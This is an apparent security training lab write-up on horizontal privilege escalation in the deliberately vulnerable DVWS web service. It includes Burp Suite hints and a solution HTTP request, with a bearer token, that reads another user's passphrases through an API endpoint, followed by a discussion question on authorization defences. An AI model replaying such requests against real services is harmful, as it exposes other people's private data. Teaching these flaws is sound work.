# Horizontal Access Control

The goal of this lab is to demonstrate a common Privilege Escalation Attack, where one user can view/modify information of another user. This attack is known as `Horizontal escalation of privilege`.

### Hint

To identify this kind of HTTP request, you should first navigate inside the application in order to trigger all possible HTTP requests sent trought the frontend/browser. Then, you can use Burp Suite to view and intercept the requests and responses exchanged between the client and the server. Check the proxy history to look for any requests that reveal sensitive information, and try to modify the requests to see if you can access other users' data.

### Solution

<details>
  <summary>View</summary>

The following HTTP request can used to view passphrases created by a user if you know the username :

```
GET /api/v2/passphrase/test HTTP/1.1
Host: dvws.cybercops.fr
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInBlcm1pc3Npb25zIjpbInVzZXI6cmVhZCIsInVzZXI6d3JpdGUiXSwiaWF0IjoxNjA5MTAwMzk3LCJleHAiOjE2MDkyNzMxOTcsImlzcyI6Imh0dHBzOi8vZ2l0aHViLmNvbS9zbm9vcHlzZWN1cml0eSJ9.MMv-cE5sDjECTwfKaxZ9usxk5qx6ekeyk01ulrE97ZI
Connection: close
Referer: http://dvws.cybercops.fr/passphrasegen.html
```
</details>

### Bonus

Check if you can use the same concept to exploit the `Vertical Access Control`.

### Discussion Question

How we can protect our application against this threat ? what patterns do you use to manage Authorization for API ? 
